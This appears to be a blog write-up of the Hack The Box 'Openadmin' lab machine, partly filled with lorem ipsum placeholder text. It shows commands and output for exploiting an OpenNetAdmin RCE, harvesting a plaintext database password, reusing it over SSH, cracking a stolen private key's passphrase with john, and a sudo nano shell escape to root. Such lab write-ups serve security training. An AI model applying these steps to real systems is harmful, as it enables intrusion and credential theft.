---
layout: single
title: Openadmin - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2020-01-07
classes: wide
header:
  teaser: /assets/images/htb-writeup-openadmin/openadmin_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-openadmin/openadmin_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. root@p3:/opt/htb/machines/resolute# nmapAutomatorDirb.sh 10.10.10.171 All
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http

    + http://openadmin.htb/index.html (CODE:200|SIZE:10918)
    + http://openadmin.htb/server-status (CODE:403|SIZE:278)
    + http://openadmin.htb/artwork/index.html (CODE:200|SIZE:14461)
    + http://openadmin.htb/music/index.html (CODE:200|SIZE:12554)

2. Looking through the websites we find that "Admin" has made a lot of posts on /artwork/blog.html, this might be a possible user.
   Also a testemonial from Craig Stephen, also possible user?

   On /music/index.html, pressing the Login button gives us what looks like admin privs for OpenNetAdmin http://openadmin.htb/ona/
   The application is running on version 18.1.1, which is NOT the latest release. A quick google shows us that this version has a
   RCE vulnerability.

3. Running the RCE script gives us a "shell" as user www-data with limited privs. We are unable to traverse, but can execute commands
    root@p3:/opt/htb/machines/openadmin# ./ona-expl.sh http://openadmin.htb/ona/
      $ whoami
        www-data

   Enumerating through the folders of /opt/ona/www we find a config file for the database connection, and within credentials.
     $ cat local/config/database_settings.inc.php
      <?php

      $ona_contexts=array (
        'DEFAULT' =>
        array (
          'databases' =>
          array (
            0 =>
            array (
              'db_type' => 'mysqli',
              'db_host' => 'localhost',
              'db_login' => 'ona_sys',
              'db_passwd' => 'n1nj4W4rri0R!',
              'db_database' => 'ona_default',
              'db_debug' => false,
            ),
          ),
          'description' => 'Default data context',
          'context_color' => '#D3DBFF',
        ),
      );

   $ ls -al /home/
    total 16
    drwxr-xr-x  4 root   root   4096 Nov 22 18:00 .
    drwxr-xr-x 24 root   root   4096 Nov 21 13:41 ..
    drwxr-x---  6 jimmy  jimmy  4096 Jan  7 06:29 jimmy
    drwxr-x---  6 joanna joanna 4096 Nov 28 09:37 joanna

We got 2 users (jimmy & joanna) and 1 password (n1nj4W4rri0R!)

4. We are able to SSH with the credentials jimmy:n1nj4W4rri0R!
   Enumerating through the box we find /var/www/internal and within index.php, main.php and logout.php.

   main.php has some interesting code - if user = jimmy and password = some-hash, then we are able to access main.php

   <?php
    $msg = '';

    if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
      if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
          $_SESSION['username'] = 'jimmy';
          header("Location: /main.php");
      } else {
          $msg = 'Wrong username or password.';
      }
    }

5. First we need to find the port this local webserver is running on, we use ss for this.
    jimmy@openadmin:/var/www/internal$ ss -tulpn
    Netid        State          Recv-Q          Send-Q                    Local Address:Port                    Peer Address:Port
    udp          UNCONN         0               0                         127.0.0.53%lo:53                           0.0.0.0:*
    tcp          LISTEN         0               80                            127.0.0.1:3306                         0.0.0.0:*
    tcp          LISTEN         0               128                           127.0.0.1:52846                        0.0.0.0:*
    tcp          LISTEN         0               128                       127.0.0.53%lo:53                           0.0.0.0:*
    tcp          LISTEN         0               128                             0.0.0.0:22                           0.0.0.0:*
    tcp          LISTEN         0               128                                   *:80                                 *:*
    tcp          LISTEN         0               128                                [::]:22                              [::]:*

   We know all of the ports except 52846, this is most likely the local webserver. Try to curl it and see if it looks right.
    jimmy@openadmin:/var/www/internal$ curl localhost:52846
      ..
      <h2>Enter Username and Password</h2>
      <div class = "container form-signin">
        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
            </div> <!-- /container -->
      ..

   This output seems to match the data in /var/www/internal/index.php. So lets try to curl main.php using jimmys credentials.
    jimmy@openadmin:/var/www/internal$ curl localhost:52846/main.php -u jimmy:n1nj4W4rri0R!
      <pre>-----BEGIN RSA PRIVATE KEY-----
      Proc-Type: 4,ENCRYPTED
      DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

      kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
      ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
      ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
      6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
      ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
      y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
      9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
      piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
      /U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
      40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
      fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
      9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
      X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
      S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
      FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
      Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
      RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
      uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
      1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
      XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
      yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
      +4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
      qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
      z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
      K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
      -----END RSA PRIVATE KEY-----
      </pre><html>
      <h3>Don't forget your "ninja" password</h3>
      Click here to logout <a href="logout.php" tite = "Logout">Session
      </html>

   main.php runs the command 'cat /home/joanna/.ssh/id_rsa' meaning we just got joanna's private ssh key.

6. Trying to login with the extracted private key requires an passphrase key, so we need to crack it.
   The key is in .pem format so before cracking we need to convert it using ssh2john.

   root@p3:/usr/share/john# python ssh2john.py /opt/htb/machines/openadmin/joanna-id_rsa > /opt/htb/machines/openadmin/hash-joanna
   root@p3:/opt/htb/machines/openadmin# john --wordlist=/usr/share/wordlists/rockyou.txt hash-joanna
    Using default input encoding: UTF-8
    Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
    Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
    Cost 2 (iteration count) is 1 for all loaded hashes
    Will run 12 OpenMP threads
    Note: This format may emit false positives, so it will keep trying even after
    finding a possible candidate.
    Press 'q' or Ctrl-C to abort, almost any other key for status
    bloodninjas      (/opt/htb/machines/openadmin/joanna-id_rsa)
    1g 0:00:00:01 DONE (2020-01-07 14:43) 0.5882g/s 8436Kp/s 8436Kc/s 8436KC/s  0125457423 ..*7¡Vamos!
    Session completed

   Password for Joanna's Private Key: bloodninjas

7. Login as Joanna and grab user.txt
    root@p3:/opt/htb/machines/openadmin# ssh joanna@openadmin.htb -i joanna-id_rsa
      Enter passphrase for key 'joanna-id_rsa': bloodninjas
    joanna@openadmin:~$ cat user.txt
      c9b2****************************


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. sudo -l shows us that we can run "sudo /bin/nano /opt/priv" without any password. Looking at gtfobins there is a privesc
   using nano to get a root shell.

   joanna@openadmin:/opt$ sudo /bin/nano /opt/priv
   Press CTRL + R to for "Read File" and then CTRL + X for "Execute Command". Next, write 'reset; sh 1>&0 2>&0' to get shell

    Command to execute: reset; sh 1>&0 2>&0
     #
     #
     # whoami
      root
     # cat /root/root.txt
      2f90****************************


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

OpenNetAdmin 18.1.1 RCE
  https://packetstormsecurity.com/files/155406/OpenNetAdmin-18.1.1-Remote-Code-Execution.html

GTFOBINS Nano
  https://gtfobins.github.io/gtfobins/nano/#sudo
